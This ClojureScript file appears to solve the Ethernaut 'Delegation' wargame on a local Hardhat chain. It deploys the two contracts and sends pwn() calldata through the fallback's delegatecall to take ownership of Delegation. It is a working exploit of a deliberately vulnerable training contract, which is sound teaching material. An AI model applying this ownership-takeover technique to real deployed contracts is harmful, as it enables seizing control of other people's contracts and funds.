(ns delegate
  (:require [utils :as u]
            [wallets :as w]))


(def delegate (atom ""))
(def delegation (atom ""))
(def user-wallet (.createRandom
                  (.-Wallet u/ethers)))

;; Fund the newly created wallet from Owner's wallet
(.sendTransaction w/local-wallet
                  (clj->js
                   {:value (.parseEther (.-utils u/ethers) "100.0")
                    :to    (.-address user-wallet)}))



(comment

  ;; Deploy the Delegate contract locally.
  ;; the local wallet will be owner
  ;; a new `randomWallet` will be the player
  (-> (.deploy (u/contract :delegate w/local-wallet)
               (.-address w/local-wallet))
      (.then #(reset! delegate %))
      (.catch #(.log js/console %)))


  ;; Deploy the Delegation contract locally.
  (-> (.deploy (u/contract :delegate/delegation w/local-wallet)
               (.-address @delegate))
      (.then #(reset! delegation %))
      (.catch #(.log js/console %)))


  ;; Make sure that the wallet is funded before using it for
  ;; calling the Delegation Contract
  (.then (.getBalance (.connect user-wallet w/local-provider))
         #(.log js/console %))


  ;; Now the user (not owner) has to call the Delegation contract.
  ;; we can call any function name because we want to dispatch the
  ;; fallback method. But we need make sure the `calldata` has function
  ;; signature of `pwn` function.
  ;;
  ;; Remember we need to change the owner of the `Delegation` contract using
  ;; using the `Delegate` contract
  ;;
  ;; `pwn` function will run with
  ;; the the storage slots of `Delegation` contract!!! <-- this is the trick!
  (let [f-sig    (u/sig-hash "/Delegate.sol/Delegate.json" "pwn()")
        to       (.-address @delegation)
        txn      (clj->js {:data f-sig :to to :gasLimit "200000"})
        ;; Connect the new wallet creater before to local (hardhat) provider
        user (.connect user-wallet w/local-provider)]
    (-> (.sendTransaction user txn)
        (.then #(.log js/console %))
        (.catch #(.log js/console %))))


  ;; Test the owner changes
  (-> (.owner @delegation)
      (.then #(.log js/console
                    (str "expected: "
                         (.-address user-wallet)
                         " got: "
                         %)))
      (.catch #(.log js/console %)))


  )
